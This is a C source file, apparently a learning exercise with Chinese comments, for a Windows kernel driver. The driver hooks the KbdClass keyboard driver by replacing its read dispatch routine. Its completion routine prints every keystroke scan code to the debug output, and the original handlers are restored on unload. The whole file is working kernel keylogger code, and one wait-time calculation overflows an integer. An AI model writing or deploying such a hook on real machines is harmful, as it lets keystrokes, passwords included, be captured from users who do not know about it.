#include<ntddk.h>
/*
原理说明：
拿到原来的IO设备函数的地址，进行备份
	但是有函数没有导出，因此需要自己添加声明
对需要HOOK的IO函数进行替换成自己的函数地址
卸载HOOK时，还原原来的函数地址表
*/
//键盘设备名称
#define KEYBORD_DRIVE_NAME (L"\\Driver\\KbdClass")
//添加未导出函数的声明,该函数通过名称获取应用对象
NTSTATUS ObReferenceObjectByName(
	PUNICODE_STRING lpszObjectName,//目标对象名称
	ULONG ulAttributes,//相关属性，一般OBJ_CASE_INSENSITIVE
	PACCESS_STATE lpAccessState,//描述访问状态结构体的指针，一般NULL
	ACCESS_MASK ulDesiredAccess,//打开使用的权限，一般为了方便FILL_ALL_ACCESS
	POBJECT_TYPE lpObjectType,//标识指针类型的枚举变量，设备对象就给IoDeviceObjectType,驱动对象就给IoDriverObjectType
	KPROCESSOR_MODE chAccessMode,//一般NULL
	PVOID lpParseContext,//一般NULL
	PVOID * lpObject);//接受相关指针的输出参数
//添加未导出类型申明
extern POBJECT_TYPE IoDeviceObjectType;
extern POBJECT_TYPE IoDriverObjectType;

PDRIVER_OBJECT g_pKeybordDriverObj;//键盘的驱动对象，卸载是需要还原
PDRIVER_DISPATCH g_oldDispatchFuncs[IRP_MJ_MAXIMUM_FUNCTION + 1];//原来的分发函数

int g_keyIRPCount = 0;//记录键盘的IRP数量，键盘的请求没有背处理完成时，不能卸载这个驱动

//自己的IO读取函数
NTSTATUS c2cReadComplete(
	IN PDEVICE_OBJECT lpDeviceObject,//相当于Win32的窗口对象
	IN PIRP lpIrp,//相当于Win32的消息Message
	IN PVOID lpContext)
{
	//字符缓冲指针和字符缓冲长度
	PUCHAR pbuffer;
	ULONG ulLength;
	int i = 0;

	if (NT_SUCCESS(lpIrp->IoStatus.Status))
	{
		//获取字符缓冲
		pbuffer = (PUCHAR)(lpIrp->AssociatedIrp.SystemBuffer);
		ulLength = lpIrp->IoStatus.Information;

		//输出HOOK的字符的十六进制
		for (i = 0; i < ulLength; i++)
		{
			DbgPrint("Capture2Control:Key=%02x\r\n", pbuffer[i]);
		}
	}
	//一次IRP完成，计数减1
	g_keyIRPCount--;
	//完成函数的框架
	if (lpIrp->PendingReturned)
	{
		IoMarkIrpPending(lpIrp);
	}
	return lpIrp->IoStatus.Status;
}
//自己的分发函数，用来替换原来的分发过程
NTSTATUS c2cReadDispatch(
	IN PDEVICE_OBJECT lpDeviceObject,
	IN PIRP lpIrp)
{
	PIO_STACK_LOCATION pIoStackLoc;
	//处理HOOK
	//IRP计数加一
	g_keyIRPCount++;
	//设置完成函数
	//使用IoSetCompletionRoutine调用可能无效
	pIoStackLoc = IoGetCurrentIrpStackLocation(lpIrp);
	pIoStackLoc->Control = SL_INVOKE_ON_SUCCESS | SL_INVOKE_ON_ERROR | SL_INVOKE_ON_CANCEL;
	pIoStackLoc->CompletionRoutine = (PIO_COMPLETION_ROUTINE)c2cReadComplete;

	//调用原始分发函数
	return (g_oldDispatchFuncs[IRP_MJ_READ])(lpDeviceObject,lpIrp);
}

NTSTATUS StartHook(PUNICODE_STRING lpszRegistryPath)
{
	//键盘对象和键盘对象名
	PDRIVER_OBJECT pKeybordDriverObj;
	UNICODE_STRING uszKeybordDriverName;

	NTSTATUS status = STATUS_SUCCESS;

	int i;

	UNREFERENCED_PARAMETER(lpszRegistryPath);
	//设置HOOK

	//初始化预定义的键盘驱动名称字符串
	RtlInitUnicodeString(&uszKeybordDriverName, KEYBORD_DRIVE_NAME);
	//获取键盘IO设备对象
	status = ObReferenceObjectByName(&uszKeybordDriverName,
		OBJ_CASE_INSENSITIVE,
		NULL, 0,
		IoDriverObjectType,
		KernelMode, NULL,
		&g_pKeybordDriverObj);
	if (!NT_SUCCESS(status))
		return status;
	//保存原始分发函数
	for (i = 0; i < IRP_MJ_MAXIMUM_FUNCTION + 1; i++)
	{
		g_oldDispatchFuncs[i] = g_pKeybordDriverObj->MajorFunction[i];
	}
	//替换读取请求分发函数
	g_pKeybordDriverObj->MajorFunction[IRP_MJ_READ] = c2cReadDispatch;

	return status;


}

VOID EndHook()
{
	LARGE_INTEGER waitIRPProcessEndTime;
	int i = 0;
	//设置等待5S
	waitIRPProcessEndTime = RtlConvertLongToLargeInteger(-5 * 1000000000 / 100);
	while (g_keyIRPCount != 0)
	{
		KeDelayExecutionThread(KernelMode, FALSE, &waitIRPProcessEndTime);
	}
	//还原分发函数
	for (i = 0; i < IRP_MJ_MAXIMUM_FUNCTION + 1; i++)
	{
		g_pKeybordDriverObj->MajorFunction[i] = g_oldDispatchFuncs[i];
	}
}

VOID DriverUnload(PDRIVER_OBJECT pDriverObject)
{
	EndHook();
}


NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING szRegistryPath)
{
	pDriverObject->DriverUnload = DriverUnload;
	return StartHook(szRegistryPath);
}